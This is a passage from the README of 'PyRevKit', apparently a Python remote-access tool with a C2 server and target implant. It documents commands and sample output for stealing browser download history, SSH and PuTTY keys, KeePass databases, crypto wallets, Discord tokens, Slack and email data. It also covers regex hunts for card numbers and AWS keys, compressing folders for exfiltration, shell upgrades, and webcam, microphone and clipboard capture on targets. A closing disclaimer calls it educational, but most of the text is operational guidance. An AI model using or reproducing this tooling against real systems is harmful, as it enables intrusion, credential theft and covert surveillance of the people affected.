✅ No LIMIT - saves everything

##

```bash
# Show first 50 downloads history entries

>>> browser downloads
[*] Extracting browser downloads...
[✓] Browser DOWNLOADS - First 50 Entries

═══ CHROME (22 entries) ═══

  [1] File: C:\Users\jdoe\Downloads\ssh_keys_backup.zip
      URL:  https://corp.github.io/infra/releases/download/v1.2/ssh_keys_backup.zip
      Size: 14336 bytes | Date: 2026-04-13 08:21:05

  [2] File: C:\Users\jdoe\Downloads\PuTTY_sessions_export.reg
      URL:  https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.82-installer.msi
      Size: 3540 bytes | Date: 2026-04-12 17:44:31

[...]

═══ EDGE (20 entries) ═══

  [1] File: C:\Users\jdoe\Downloads\AzureAD_users_export.csv
      URL:  https://portal.azure.com/api/export/users/csv
      Size: 52224 bytes | Date: 2026-04-13 09:01:44

  [2] File: C:\Users\jdoe\Downloads\BitLocker_recovery_keys.docx
      URL:  https://corp.sharepoint.com/sites/IT/Documents/BitLocker_recovery_keys.docx
      Size: 28672 bytes | Date: 2026-04-12 16:55:11

[...]

═══ FIREFOX (8 entries) ═══

  [1] File: C:\Users\jdoe\Downloads\docker-compose.yml
      URL:  https://raw.githubusercontent.com/corp/devops/main/docker-compose.yml
      Size: 3712 bytes | Date: 2026-04-12 20:03:55

  [2] File: C:\Users\jdoe\Downloads\id_rsa
      URL:  http://10.0.0.5:8080/api/keys/download/id_rsa
      Size: 1679 bytes | Date: 2026-04-12 19:49:21

[...]

────────────────────────────────────────────────────
Total shown: 50 entries across 3 browsers
💡 Export all download history with: browser downloads --save
...
```

##

```bash
# Save all download history entries to file → downloads/browser_cookies_TIMESTAMP.txt

>>> browser downloads --save
[*] Extracting browser downloads and saving to file...
[✓] Browser DOWNLOADS - Complete Data Saved to File

╔═══════════════════════════════════════════════════════╗
║  FILE SAVED SUCCESSFULLY                              ║
╚═══════════════════════════════════════════════════════╝

Filename: browser_downloads_20260413_000545.txt
Location: downloads\browser_downloads_20260413_000545.txt
Size: 27.94 KB
Total Entries: 128

💡 Download this file with:
   >>> download downloads\browser_downloads_20260413_000545.txt
```
✅ No LIMIT - saves everything

##

#### Smart File Exfiltration

```bash
# Auto-find sensitive files
# '*.kdbx',      # KeePass databases
# ' *.ppk',       # PuTTY private keys
# '*.pem',       # SSL certificates / SSH keys
# '*.key',       # Generic key files
# '*.p12',       # PKCS12 certificates
# '*.pfx',       # Windows certificates
# '*wallet.dat', # Cryptocurrency wallets
# '*.ovpn',      # OpenVPN configs
# '*password*',  # Files with 'password' in name
# '*secret*',    # Files with 'secret' in name
# '*credential*',# Files with 'credential' in name
# '*.rdp',       # Remote Desktop configs
# 'id_rsa',      # SSH private key
# 'id_dsa',      # SSH private key
# 'id_ecdsa',    # SSH private key
# 'id_ed25519',  # SSH private key

>>> exfil auto
[*] Smart exfiltration mode: auto
[✓] Smart Exfiltration - AUTO

Sensitive Files Found: 50

1. 1CA9E47175BB14B3CE13C27C0C1A5F8C3BB7D83A.key
   Path: C:\Users\jdoe\.gnupg\private-keys-v1.d\1CA9E47175BB14B3CE13C27C0C1A5F8C3BB7D83A.key
   Size: 3.93 KB
   Matched: *.key

[...]

Use download command to retrieve specific files
```

##

```bash
# Search for SSN, credit cards, keys
# ssn: r'\b\d{3}-\d{2}-\d{4}\b'
# credit_card: r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'
# api_key: r'["\']?[a-zA-Z0-9_-]{32,}["\']?'
# aws_key: r'AKIA[0-9A-Z]{16}'
# private_key: r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'
# email: r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
# ipv4: r'\b(?:\d{1,3}\.){3}\d{1,3}\b'

>>> exfil patterns
[*] Smart exfiltration mode: patterns
[✓] Smart Exfiltration - PATTERNS

Pattern Matches Found: 2 types

═══ IPV4 ═══
File: C:\Users\jdoe\\Documents\ip_address.txt
Count: 1
Samples: 172.45.2.123

═══ CREDIT_CARD ═══
File: C:\Users\jdoe\\Documents\payment.txt
Count: 1
Samples: 4131 1111 1411 1121
```

##

```bash
# Compress a directory for easier exfiltration

>>> exfil compress C:\Users\jdoe\downloads
[*] Compressing directory: C:\Users\jdoe\downloads
[✓] Smart Exfiltration - COMPRESS

Archive Created: exfil_downloads_20260413_180940.zip
Location: C:\Users\jdoe\AppData\Local\Temp\exfil_downloads_20260413_180940.zip
Size: 9.88 MB
Files Compressed: 11

Use download command to retrieve: download C:\Users\jdoe\AppData\Local\Temp\exfil_downloads_20260413_180940.zip
```

##

#### Email and Messaging Extraction

```bash
# List email clients found 

>>> msg email
[*] Extracting email data...
[✓] Message Extraction - EMAIL_LIST

═══ OUTLOOK ═══
Status: Found
Path: C:\Users\jdoe\AppData\Roaming\Microsoft\Outlook
Data Files: None found
Note: No PST/OST files in Outlook directory

═══ WINDOWS_MAIL ═══
Status: Found
Location: C:\Users\jdoe\AppData\Local\Comms\UnistoreDB
```

Be aware that many messaging apps now connect remotely without storing messages locally, so emails may not be extractable.

##

```bash
# Export Windows Mail database via VSS

>>> msg windows_mail_export
[*] Extracting windows_mail_export data...
[✓] Message Extraction - WINDOWS_MAIL_EXPORT

╔════════════════════════════════════════════════════╗
║  WINDOWS MAIL DATABASE EXPORTED                    ║
╚════════════════════════════════════════════════════╝

Method: Volume Shadow Copy (VSS)
Filename: windows_mail_export_20260413_181541.zip
Location: downloads\windows_mail_export_20260413_181541.zip
Files Archived: 8
Original Size: 27.21 MB
ZIP Size: 0.37 MB
Compression: 98.7%

💡 Download with:
   >>> download windows_mail_export_20260413_181541.zip
```

##

```bash
>>> msg thunderbird
[*] Extracting thunderbird data...
[✓] Message Extraction - EMAIL_THUNDERBIRD

═══ THUNDERBIRD MAIL FOLDERS ═══
Folders Found: 4

  1. Inbox
     Path: /home/jdoe/.thunderbird/r4k2m9lp.default/Mail/Local Folders/Inbox
     Size: 2145.67 KB

  2. Sent
     Path: /home/jdoe/.thunderbird/r4k2m9lp.default/Mail/Local Folders/Sent
     Size: 876.34 KB

  3. Archives
     Path: /home/jdoe/.thunderbird/r4k2m9lp.default/Mail/Local Folders/Archives
     Size: 8934.11 KB

  4. Drafts
     Path: /home/jdoe/.thunderbird/r4k2m9lp.default/Mail/Local Folders/Drafts
     Size: 43.20 KB

Note: Mail folders found - use download to retrieve mbox files

💡 Download a folder with:
   >>> download /home/jdoe/.thunderbird/r4k2m9lp.default/Mail/Local Folders/Inbox
```

##

```bash
>>> msg discord
[*] Extracting discord data...
[✓] Message Extraction - DISCORD

═══ DISCORD LOCAL STORAGE ═══
Tokens Found: 2

  Token 1: NzE4NDk2MzI4NDk2MzI4NA.Xx1aZQ.k7dG2f9mNpQrVsLwYhTjBc3eKu8
  Token 2: ODIxNzM0NTY3ODkwMTIzNg.Yy2bAR.m9eH3g0nOpRwWtMxZiUkCd4fLv9

Note: Discord tokens found in Local Storage

⚠️  Tokens grant full account access - treat as credentials
💡 Validate token with Discord API:
   curl -H "Authorization: <token>" https://discord.com/api/v9/users/@me
```

##

```bash
>>> msg slack
[*] Extracting slack data...
[✓] Message Extraction - SLACK

═══ SLACK DATA LOCATIONS ═══
Locations Found: 2

  1. Path: /home/jdoe/.config/Slack/storage
     Note: Slack data found - contains tokens and workspace info

  2. Path: /home/jdoe/.config/Slack/Cookies
     Note: Slack data found - contains tokens and workspace info

💡 Download Slack storage with:
   >>> download /home/jdoe/.config/Slack/storage
```

##

#### Shell Upgrading

```bash
# Switch to PowerShell (Windows)

>>> shell powershell
[*] Checking shell upgrade: powershell
[✓] Shell Upgrade Check - POWERSHELL

PowerShell available - use 'powershell -Command <cmd>' for PowerShell commands

>>> powershell -Command ls

    Directory: C:\Users\jdoe\revshell

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        2026-04-13   6:16 PM                downloads
-a----        2026-04-06   2:57 PM         204286 pyrev_target.py
```

##

```bash
# Switch to Bash (Linux/macOS)

>>> shell bash
[*] Checking shell upgrade: bash
[✓] Shell Upgrade Check - BASH

Bash available - shell commands will use bash

>>> bash -c "id && hostname"
uid=1000(jdoe) gid=1000(jdoe) groups=1000(jdoe),4(adm),27(sudo)
prod-linux-01
```

##

```bash
# Switch to Zsh

>>> shell zsh
[*] Checking shell upgrade: zsh
[✓] Shell Upgrade Check - ZSH

Zsh available - use 'zsh -c <cmd>' for zsh commands

>>> zsh -c "echo $ZSH_VERSION && whoami"
5.9
jdoe
```

##

```bash
# Check Python availability

>>> shell python
[*] Checking shell upgrade: python
[✓] Shell Upgrade Check - PYTHON

Python 3.10.11 (tags/v3.10.11:7d4cc5a, Apr  5 2023, 00:38:17) [MSC v.1929 64 bit (AMD64)] available at C:\Users\jdoe\AppData\Local\Programs\Python\Python310\python.exe - use 'python -c <code>' for Python commands

>>> python -c malicious_script.py
```

##

```bash
# PTY upgrade info (Linux/macOS)

>>> shell pty
[*] Checking shell upgrade: pty
[✓] Shell Upgrade Check - PTY

PTY module available - full TTY shell upgrade possible (not implemented in this version)

ℹ️  PTY upgrade not yet active in this version of PyRevKit
💡 To get a full interactive TTY shell manually, run on the target:
   python3 -c "import pty; pty.spawn('/bin/bash')"
```

##

## Configuration

### Server Configuration

Edit `pyrev_server.py` constants:

```python
LOOT_DIR = "loot"           # Directory for downloaded files
PAYLOADS_DIR = "payloads"   # Directory for payloads to upload
CREDS_FILE = "credentials.json"
```

##

### Target Configuration

Edit `pyrev_target.py` header:

```python
TARGET_ID = "machineA"        # Unique identifier
SERVER_HOST = "192.168.2.110" # C2 server address
SERVER_PORT = 8765            # C2 server port
AUTO_LOGIN = ""               # Set for autonomous mode
AUTO_PASSWORD = ""            # Set for autonomous mode
DOWNLOAD_DIR = "downloads"    # Received files directory
```

##

### Client Configuration

Edit `pyrev_client.py` constants:

```python
OP_ID = "operator1"  # Operator identifier
```

##

## 🔒 Security Considerations

### ⚠️ Important Warnings

1. **For Educational/Authorized Use Only**: Only use on systems you own or have explicit permission to test
2. **Credential Storage**: Passwords are hashed but stored on disk

##

## Troubleshooting

### Connection Issues

**Problem**: `[ERROR] Connection rejected`

**Solution**:
```bash
# Verify server is running
netstat -tulpn | grep 8765

# Check firewall
sudo ufw allow 8765/tcp

# Verify certificate exists
ls -l server.pem
```

##

### Authentication Issues

**Problem**: `Authentication failed`

**Solution**:
```bash
# Verify credentials exist
cat credentials.json

# Re-add credentials
python pyrev_server.py -creds target machineA NewPassword123

# Check for typos in login/password
```

##

### File Transfer Issues

**Problem**: `[✗] File not found`

**Solution**:
```bash
# For download: verify file exists on target
>>> ls /path/to/file

# For upload: verify file in payloads/
ls -l payloads/
```

**Problem**: `[✗] File too large`

**Solution**: Files over ~50MB are rejected. Compress or split the file:
```bash
# On target
tar -czf archive.tar.gz large_directory/
>>> download archive.tar.gz
```

##

### Media Capture Issues

**Problem**: `[✗] OpenCV not installed`

**Solution**:
```bash
# On target machine
pip install opencv-python
```

**Problem**: `[✗] Cannot access webcam`

**Solutions**:
- Close other applications using the webcam
- Verify webcam is connected: `ls /dev/video*` (Linux)
- Check user permissions: `sudo usermod -a -G video $USER` (Linux)

**Problem**: `[✗] Audio libraries not installed`

**Solution**:
```bash
# On target machine
pip install sounddevice scipy numpy

# Linux may also need
sudo apt-get install portaudio19-dev python3-dev
```

**Problem**: Audio recording fails or is silent

**Solutions**:
- Check microphone is not muted
- Verify default audio device: `python -c "import sounddevice as sd; print(sd.query_devices())"`

##

### Search Issues

**Problem**: No results found when files clearly exist

**Solutions**:
- Check file permissions (target may not have access)
- Increase limit: `search *.pdf --limit 500`
- Verify pattern syntax (case-insensitive)
- Try broader pattern: `search *password*`

**Problem**: Content search returns too many results

**Solutions**:
- Use more specific search term
- Adjust limit: `search --content "exact_phrase" --limit 50`

**Problem**: Search is slow

**Solution**: This is normal for large filesystems. Consider:
- Reducing limit: `--limit 100`
- Searching specific file types only
- Being more specific with patterns

##

### Clipboard Issues

**Problem**: `[✗] Clipboard library not installed`

**Solution**:
```bash
# On target machine
pip install pyperclip
```

**Problem**: `[✗] Clipboard read timeout`

**Solutions**:
- **Linux**: Install clipboard tools
  ```bash
  sudo apt-get install xclip  # For X11
  sudo apt-get install wl-clipboard  # For Wayland
  ```
- Verify graphical environment: `echo $DISPLAY` (should show `:0` or similar)
- Not supported on headless servers

**Problem**: Clipboard command hangs

**Solution**: 
- Update to latest version (timeout protection added)
- Run diagnostic: `python test_clipboard.py` on target
- Ensure target is not headless

**Problem**: Clipboard works but returns empty

**Solutions**:
- Clipboard is actually empty
- Clipboard contains non-text data (images, files)
- Copy some text manually and try again

##

### System Information Issues

**Problem**: Some information missing in sysinfo output

**Solution**: This is normal. Information availability depends on:
- Operating system
- User permissions
- Python version

No fix needed - system provides what it can access.

##

## Platform-Specific Notes

**Windows:**
- All features work out of the box after installing dependencies
- Clipboard works without additional tools
- Webcam LED may turn on during capture

**Linux:**
- Webcam requires user in `video` group
- Audio requires user in `audio` group  
- Clipboard requires `xclip` (X11) or `wl-clipboard` (Wayland)
- Headless servers: media and clipboard features unavailable

**macOS:**
- All features work natively
- First use requires permission prompts (webcam, microphone, clipboard)
- Clipboard uses native `pbcopy`/`pbpaste`

##

## Legal Disclaimer

This proof of concept (PoC) is provided for educational purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this program. Use responsibly and only on systems you own or have explicit permission to test.

##

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**⭐ If you find this project useful, please consider giving it a star!**